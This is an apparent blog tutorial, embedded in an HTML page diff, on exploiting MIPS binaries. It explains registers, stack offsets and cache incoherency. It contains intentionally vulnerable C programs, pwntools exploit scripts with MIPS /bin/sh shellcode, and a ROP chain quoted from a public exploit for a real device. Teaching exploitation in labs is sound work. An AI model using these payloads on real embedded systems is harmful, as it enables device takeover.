@@ -1,0 +1,1398 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image1.jpg&#34; alt=&#34;image1.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;When you get into embedded hacking, you encounter binaries and environments from various RISC architectures.&lt;/p&gt;
+&lt;p&gt;Most of the time, you&amp;#x2019;ll work with and see the ARM architecture. However, it&amp;#x2019;s also not uncommon to come across MIPS and MIPSEL architectures&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;The assembly instructions and registers look unfamiliar from the start, and to top it off, you have to worry about the Cache&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s cover the most fundamental aspects needed for exploitation in this somewhat alien MIPS environment!&lt;/p&gt;
+&lt;h2 id=&#34;1-MIPS-vs-MIPSEL&#34;&gt;&lt;a href=&#34;#1-MIPS-vs-MIPSEL&#34; class=&#34;headerlink&#34; title=&#34;1. MIPS vs MIPSEL&#34;&gt;&lt;/a&gt;1. MIPS vs MIPSEL&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image2.jpg&#34; alt=&#34;image2.jpg&#34;&gt;&lt;/p&gt;
+&lt;p&gt;MIPS is one of the RISC architectures designed so that registers and instructions perform a single role. Although it has the disadvantage of having many registers, its instructions are simple, leading to low power consumption, which is why it&amp;#x2019;s primarily used in embedded devices.&lt;/p&gt;
+&lt;p&gt;Because the MIPS instruction set is so cleanly organized, it&amp;#x2019;s often the architecture taught in university computer architecture courses (that was the case for me)&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;MIPS is big-endian, while MIPSEL is little-endian. MIPSEL only adopts the little-endian data storage format, so it operates in the same way as MIPS. Since the commonly used x86-64 architecture also uses this data storage method, you can use pwntools functions in the same way for MIPSEL. Therefore, in a MIPSEL environment, you can use pwntools&amp;#x2019; &lt;code&gt;p32()&lt;/code&gt; and &lt;code&gt;p64()&lt;/code&gt; functions as they are!&lt;/p&gt;
+&lt;h2 id=&#34;2-MIPS-Stack-amp-Register&#34;&gt;&lt;a href=&#34;#2-MIPS-Stack-amp-Register&#34; class=&#34;headerlink&#34; title=&#34;2. MIPS Stack &amp;amp; Register&#34;&gt;&lt;/a&gt;2. MIPS Stack &amp;amp; Register&lt;/h2&gt;&lt;p&gt;Before we dive into exploitation, it&amp;#x2019;s necessary to understand the stack structure and behavior in a MIPS environment.&lt;/p&gt;
+&lt;p&gt;The official references for the MIPS architecture are &lt;a href=&#34;https://www.cs.cornell.edu/courses/cs3410/2008fa/MIPS_Vol1.pdf&#34;&gt;MIPS32 Architecture For Programmers Volume I&lt;/a&gt; and the &lt;a href=&#34;https://www.cs.unibo.it/~solmi/teaching/arch_2002-2003/AssemblyLanguageProgDoc.pdf&#34;&gt;MIPS Assembly Language Programmer&amp;#x2019;s Guide&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;From these, let&amp;#x2019;s cover the knowledge we need from an exploitation perspective. First, here is a list of registers used in MIPS and their roles.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&amp;#xC774;&amp;#xB984;&lt;/th&gt;
+&lt;th&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD130; &amp;#xBC88;&amp;#xD638;&lt;/th&gt;
+&lt;th&gt;&amp;#xC5ED;&amp;#xD560;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$zero&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$0&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Always returns 0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$at&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Reserved for assembler to calculate pseudo-instructions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$v0&lt;/code&gt; ~ &lt;code&gt;$v1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$2&lt;/code&gt; ~ &lt;code&gt;$3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores values returned from functions&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$a0&lt;/code&gt; ~ &lt;code&gt;$a3&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$4&lt;/code&gt; ~ &lt;code&gt;$7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores function arguments&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t0&lt;/code&gt; ~ &lt;code&gt;$t7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$8&lt;/code&gt; ~ &lt;code&gt;$15&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used for temporary value storage by the assembler or language&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$s0&lt;/code&gt; ~ &lt;code&gt;$s7&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$16&lt;/code&gt; ~ &lt;code&gt;$23&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used to store long-lasting values (callee-saved)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$t8&lt;/code&gt; ~ &lt;code&gt;$t9&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$24&lt;/code&gt; ~ &lt;code&gt;$25&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Used for temporary value storage by the assembler or language&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$k0&lt;/code&gt; ~ &lt;code&gt;$k1&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$26&lt;/code&gt; ~ &lt;code&gt;$27&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Reserved for the OS kernel&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$gp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$28&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the global pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$sp&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$29&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the stack pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$fp&lt;/code&gt;/&lt;code&gt;$s8&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$30&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the value of the frame pointer&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$ra&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;&lt;code&gt;$31&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Stores the return address&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;The registers to pay close attention to are &lt;code&gt;$ra&lt;/code&gt;, &lt;code&gt;$sp&lt;/code&gt;, and &lt;code&gt;$s8&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In MIPS, the &lt;code&gt;$ra&lt;/code&gt; register holds the function&amp;#x2019;s return address. It&amp;#x2019;s helpful to think of it as serving the role of &lt;code&gt;RET&lt;/code&gt; in x86/x64.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400734 &amp;lt;main+0&amp;gt;:    addiu   sp,sp,-136
+0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)
+0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
+0x00400740 &amp;lt;main+12&amp;gt;:   move    s8,sp
+...
+0x004007d8 &amp;lt;main+164&amp;gt;:  move    sp,s8
+0x004007dc &amp;lt;main+168&amp;gt;:  lw      ra,132(sp)
+0x004007e0 &amp;lt;main+172&amp;gt;:  lw      s8,128(sp)
+0x004007e4 &amp;lt;main+176&amp;gt;:  addiu   sp,sp,136
+0x004007e8 &amp;lt;main+180&amp;gt;:  jr      ra&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The structure works by saving the return address from the &lt;code&gt;$ra&lt;/code&gt; register onto the stack during the function prologue and then jumping to the return address in the &lt;code&gt;$ra&lt;/code&gt; register during the function epilogue.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;$ra&lt;/code&gt; register&amp;#x2019;s value is saved to the stack relative to the &lt;code&gt;$sp&lt;/code&gt; (current stack pointer) and &lt;code&gt;$s8&lt;/code&gt; (frame pointer). Therefore, the first step in stack-based exploitation is to calculate the offset by determining the buffer&amp;#x2019;s starting position and the return address&amp;#x2019;s location relative to the &lt;code&gt;$sp&lt;/code&gt; register.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;lw      $s2, 24(sp)      ; Load value at sp+24 into $s2 (address of &amp;amp;&amp;quot;/bin/sh&amp;quot;)
+lw      $s1, 20(sp)      ; Load value at sp+20 into $s1 (address of &amp;amp;system)
+lw      $s0, 16(sp)      ; Load value at sp+16 into $s0 (address of &amp;amp;sleep)
+lw      $ra, 28(sp)      ; Load value at sp+28 into $ra (address of the next gadget)
+addiu   sp, sp, 32       ; Clean up the stack pointer
+jr      $ra              ; Jump to $ra (the next gadget)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The gadget form needed for the Shellcode and ROP chains, which will be explained later, is shown above.&lt;/p&gt;
+&lt;p&gt;The most basic form involves loading values from the stack into the &lt;code&gt;$s0-$s7&lt;/code&gt; registers using the &lt;code&gt;lw&lt;/code&gt; instruction, cleaning up the stack pointer with &lt;code&gt;addiu&lt;/code&gt;, and then jumping to the return address with &lt;code&gt;jr&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since this is the most basic form, you can combine the necessary arguments and instructions to fit the specific situation and environment.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;move    $t9, $s1         ; Move $s1 (system address) to $t9 (register for calls)
+jalr    $t9              ; Jump to the address in $t9&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Function execution is performed via the &lt;code&gt;jalr&lt;/code&gt; instruction. You can understand it as working like the call instruction in x86-64.&lt;/p&gt;
+&lt;h2 id=&#34;3-Cache-Incoherency&#34;&gt;&lt;a href=&#34;#3-Cache-Incoherency&#34; class=&#34;headerlink&#34; title=&#34;3. Cache Incoherency&#34;&gt;&lt;/a&gt;3. Cache Incoherency&lt;/h2&gt;&lt;p&gt;When exploiting a real device configured with a MIPS environment, you&amp;#x2019;ll sometimes need to use shellcode due to the nature of IoT/embedded devices. However, there&amp;#x2019;s a crucial point to be aware of when using shellcode in a MIPS environment.&lt;/p&gt;
+&lt;p&gt;That is the Cache.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image3.png&#34; alt=&#34;image3.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;MIPS uses two types of caches: the Instruction Cache, which holds opcodes, and the Data Cache, which records data.&lt;/p&gt;
+&lt;p&gt;The problem, known as Cache Incoherency, occurs because the value we input (our shellcode) goes into the Data Cache, but the CPU tries to execute instructions from the existing Instruction Cache.&lt;/p&gt;
+&lt;p&gt;To solve this, we need to bring the data from the Data Cache to the Instruction Cache. This process, depending on the cache write policy, involves synchronizing with memory and then invalidating the Instruction Cache. The important part here is that we need to flush the Data Cache to force a cache write.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image4.png&#34; alt=&#34;image4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The state of memory and the caches after the Data Cache has been flushed is shown above. Since the instructions in the Instruction Cache and memory are no longer identical, the Instruction Cache is invalidated. Then, the code from the Data Cache, now synchronized with memory, is executed.&lt;/p&gt;
+&lt;p&gt;Only by going through this process can we create a flow where the shellcode we&amp;#x2019;ve inserted can actually be executed.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image5.png&#34; alt=&#34;image5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The easiest way to achieve this is by calling the &lt;code&gt;sleep()&lt;/code&gt; function.&lt;/p&gt;
+&lt;p&gt;When &lt;code&gt;sleep()&lt;/code&gt; is called, execution is passed to another process or thread, causing other data to be generated in the Data Cache. Later, according to the cache write policy, a flush occurs, and the data residing in memory is also written to the Data Cache.&lt;/p&gt;
+&lt;p&gt;Therefore, if you&amp;#x2019;re using shellcode in a MIPS environment, it&amp;#x2019;s a good practice to structure your exploit by calling &lt;code&gt;sleep()&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;4-MIPS-Exploit-Practice&#34;&gt;&lt;a href=&#34;#4-MIPS-Exploit-Practice&#34; class=&#34;headerlink&#34; title=&#34;4. MIPS Exploit Practice&#34;&gt;&lt;/a&gt;4. MIPS Exploit Practice&lt;/h2&gt;&lt;p&gt;Let&amp;#x2019;s practice exploitation in a MIPS environment with a simple example.&lt;/p&gt;
+&lt;h3 id=&#34;4-1-RTL&#34;&gt;&lt;a href=&#34;#4-1-RTL&#34; class=&#34;headerlink&#34; title=&#34;4-1: RTL&#34;&gt;&lt;/a&gt;4-1: RTL&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);
+}
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *argv[])&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
+        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We&amp;#x2019;ll practice finding the stack offset using a basic RTL in a MIPS environment. This example code creates a vulnerable function where a buffer overflow occurs.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;0x00400738 &amp;lt;main+4&amp;gt;:    sw      ra,132(sp)  ; ret
+0x0040073c &amp;lt;main+8&amp;gt;:    sw      s8,128(sp)
+0x00400740 &amp;lt;main+12&amp;gt;:	  move	  s8,sp
+...
+0x0040079c &amp;lt;main+104&amp;gt;:	addiu	  v0,s8,24  ; buf
+0x004007a0 &amp;lt;main+108&amp;gt;:	move	  a1,v0
+...
+0x004007b0 &amp;lt;main+124&amp;gt;:	jalr	  t9  ; scanf&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;By checking the assembly with gdb, we can find the following offsets:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Return address: sp + 132&lt;br&gt;We can see that the value in the $ra register, which holds the return address, is stored at sp+132.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Buffer start: sp + 24&lt;br&gt;We can see that the argument for scanf() involves the operation s8 + 24 (and s8 was set to sp).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Therefore, the offset is 132 - 24 = 108.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+
+p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)
+
+sh = &lt;span class=&#34;hljs-number&#34;&gt;0x4006e0&lt;/span&gt;
+
+pay = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * &lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt;
+pay += p32(sh)
+
+p.sendline(pay)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image6.png&#34; alt=&#34;image6.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After writing the exploit code with the correct offset and running it, we can confirm that it works perfectly.&lt;/p&gt;
+&lt;h3 id=&#34;4-2-shellcode&#34;&gt;&lt;a href=&#34;#4-2-shellcode&#34; class=&#34;headerlink&#34; title=&#34;4-2: shellcode&#34;&gt;&lt;/a&gt;4-2: shellcode&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+        setvbuf(&lt;span class=&#34;hljs-built_in&#34;&gt;stdout&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, _IONBF, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+
+        &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;];
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;buf: %p\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%s\n&amp;quot;&lt;/span&gt;, buf);
+        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is an example of using shellcode while considering the Cache Incoherency issue in MIPS that we discussed earlier. This is also a buffer overflow vulnerable code, built with NX disabled.&lt;/p&gt;
+&lt;p&gt;The return address offset is the same as in the previous problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image7.png&#34; alt=&#34;image7.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Additionally, I used an address within &lt;code&gt;__libc_csu_init&lt;/code&gt; for the stack-cleaning gadget.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; *
+&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; time
+
+p = remote(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;3312&lt;/span&gt;)
+
+sh = &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;\x69\x6e\x02\x3c\x2f\x62\x42\x24\xec\xff\xa2\xaf\x73\x68\x03\x3c\x2f\x2f\x63\x24\xf0\xff\xa3\xaf\xf4\xff\xa0\xaf\xfc\xff\xa0\xaf\xfc\xff\xa6\x27\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01\x01\x01&amp;quot;&lt;/span&gt;
+
+sleep_addr = &lt;span class=&#34;hljs-number&#34;&gt;0x00400970&lt;/span&gt;
+gadget = &lt;span class=&#34;hljs-number&#34;&gt;0x00400824&lt;/span&gt;
+
+p.recvuntil(&lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;buf: &amp;quot;&lt;/span&gt;)
+addr = int(p.recv(&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)
+
+log.success(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;addr is {}&amp;quot;&lt;/span&gt;.format(hex(addr)))
+
+pay = sh
+pay += &lt;span class=&#34;hljs-string&#34;&gt;b&amp;quot;A&amp;quot;&lt;/span&gt; * (&lt;span class=&#34;hljs-number&#34;&gt;108&lt;/span&gt; - len(sh))
+pay += p32(sleep_addr)
+pay += p32(gadget)
+pay += p32(addr)
+
+time.sleep(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)
+p.sendline(pay)
+p.interactive()&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The most basic approach is to call the &lt;code&gt;sleep()&lt;/code&gt; function, followed by a stack-cleaning gadget, and then jump to the shellcode address. The shellcode is for MIPS.&lt;/p&gt;
+&lt;p&gt;In a real-world scenario, using shellcode would also require a libc base leak and gadget calls to invoke &lt;code&gt;sleep()&lt;/code&gt;, which means you would be performing a ROP attack. You can refer to the link below!&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/48994&#34;&gt;https://www.exploit-db.com/exploits/48994&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;First ROP (sleep_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x0004c974&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab2e974&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c97c&lt;/span&gt;      move    t9, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c980&lt;/span&gt;      lw      ra, (var_1ch)
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c984&lt;/span&gt;      lw      s0, (var_18h)
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c988&lt;/span&gt;      addiu   a0, zero, &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; ; arg1
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c98c&lt;/span&gt;      addiu   a1, zero, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; ; arg2
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c990&lt;/span&gt;      move    a2, zero
+&lt;span class=&#34;hljs-number&#34;&gt;0x0004c994&lt;/span&gt;      jr      t9
+
+Second ROP (stack_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab1bfa8&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fa8&lt;/span&gt;      addiu   s0, sp, &lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fac&lt;/span&gt;      move    a0, s3
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb0&lt;/span&gt;      move    a1, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb4&lt;/span&gt;      move    t9, s1
+&lt;span class=&#34;hljs-number&#34;&gt;0x00039fb8&lt;/span&gt;      jalr    t9
+
+Third ROP (call_gadget): &lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt; + libc_base = &lt;span class=&#34;hljs-number&#34;&gt;0x2ab226d8&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x000406d8&lt;/span&gt;      move    t9, s0
+&lt;span class=&#34;hljs-number&#34;&gt;0x000406dc&lt;/span&gt;      jalr    t9
+
+payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;160&lt;/span&gt; + sleep_addr + call_gadget +  sleep_gadget + junk + stack_gadget + shellcode
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Here are the ROP gadgets and payload section used in that link.&lt;/p&gt;
+&lt;p&gt;The first gadget is for setting up the arguments needed to use &lt;code&gt;sleep()&lt;/code&gt;. The use of &lt;code&gt;zero&lt;/code&gt; instead of &lt;code&gt;0&lt;/code&gt; to initialize a register to zero is another characteristic feature of MIPS!&lt;/p&gt;
+&lt;p&gt;The second gadget is a stack-cleaning gadget, which can be easily found in functions like &lt;code&gt;__libc_csu_init&lt;/code&gt;, as introduced in our earlier exercise.&lt;/p&gt;
+&lt;p&gt;Finally, you can see how a ROP chain is constructed along with a function call gadget.&lt;/p&gt;
+&lt;p&gt;Finally, for those who find it a bit difficult to practice in a MIPS environment and want to study with CTF problems, you can refer to the challenges below!&lt;/p&gt;
